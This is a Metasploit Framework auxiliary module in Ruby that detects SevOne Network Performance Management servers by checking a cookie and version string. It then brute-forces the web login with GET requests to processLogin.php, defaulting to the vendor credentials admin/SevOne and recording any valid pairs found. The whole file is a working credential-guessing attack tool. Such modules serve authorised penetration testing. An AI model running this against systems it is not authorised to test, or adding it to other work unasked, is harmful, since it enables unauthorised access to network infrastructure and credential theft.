##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(update_info(info,
			'Name'	=> 'SevOne Network Performance Management Application Brute Force Login Utility',
			'Description'    => %{
					This module scans for SevOne Network Performance Management System Application,
				finds its version, and performs login brute force to identify valid credentials.
			},
			'Author'         =>
				[
					'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
				],
			'DisclosureDate' => 'Jun 07 2013',
			'License'        => MSF_LICENSE
		))
	register_options(
		[
			OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),
			OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'SevOne'])
		], self.class)
	end

	def run_host(ip)
		unless is_app_sevone?
			print_error("#{rhost}:#{rport} - Application does not appear to be SevOne. Module will not continue.")
			return
		end

		print_status("#{rhost}:#{rport} - Starting login brute force...")
		each_user_pass do |user, pass|
			do_login(user, pass)
		end
	end

	#
	# What's the point of running this module if the app actually isn't SevOne?
	#
	def is_app_sevone?
		res = send_request_cgi(
		{
			'uri'       => '/doms/about/index.php',
			'method'    => 'GET'
		})

		if (res and res.code.to_i == 200 and res.headers['Set-Cookie'].include?('SEVONE'))
			version_key = /Version: <strong>(.+)<\/strong>/
			version = res.body.scan(version_key).flatten
			print_good("#{rhost}:#{rport} - Application confirmed to be SevOne Network Performance Management System version #{version}")
			return true
		end
		return false
	end

	#
	# Brute-force the login page
	#
	def do_login(user, pass)
		vprint_status("#{rhost}:#{rport} - Trying username:'#{user.inspect}' with password:'#{pass.inspect}'")
		begin
			res = send_request_cgi(
			{
				'uri'       => "/doms/login/processLogin.php",
				'method'    => 'GET',
				'vars_get'    =>
				{
					'login' => user,
					'passwd' => pass,
					'tzOffset' => '-25200',
					'tzString' => 'Thur+May+05+1983+05:05:00+GMT+0700+'
				}
			})

		if res.nil?
			print_error("Connection timed out")
			return :abort
		end

		check_key = "The user has logged in successfully."

		key = JSON.parse(res.body)["statusString"]

		if (not res or key != "#{check_key}")
			vprint_error("#{rhost}:#{rport} - FAILED LOGIN. '#{user.inspect}' : '#{pass.inspect}' with code #{res.code}")
			return :skip_pass
		else
			print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN. '#{user.inspect}' : '#{pass.inspect}'")

			report_hash = {
				:host   => rhost,
				:port   => rport,
				:sname  => 'SevOne Network Performance Management System Application',
				:user   => user,
				:pass   => pass,
				:active => true,
				:type   => 'password'}

			report_auth_info(report_hash)
			return :next_user
		end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
			print_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
			return :abort
		end
	end
end
